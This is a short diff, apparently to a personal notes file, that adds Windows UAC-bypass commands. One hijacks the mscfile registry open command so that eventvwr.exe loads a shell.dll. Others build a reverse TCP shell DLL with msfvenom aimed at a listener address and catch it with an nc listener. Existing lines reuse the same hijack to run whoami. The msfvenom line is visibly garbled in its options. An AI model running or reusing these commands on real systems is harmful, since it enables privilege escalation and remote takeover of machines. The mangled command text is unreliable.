@@ -1,3 +1,15 @@
+
+reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "rundll32.exe C:\users\public\shell.dll,0" /f
+eventvwr.exe
+
+msfvenom -pdows/shell_reverse_tcp LHOST=192.168.50.201 LPORT=6666 -f d-f -o s-o shell.dll
+nc -lvnp 6666
+
+
+
+
+
+
 REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe /k whoami /groups" /f
 REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe /c whoami > C:\Users\IEUser\Desktop\proof.txt" /f
 
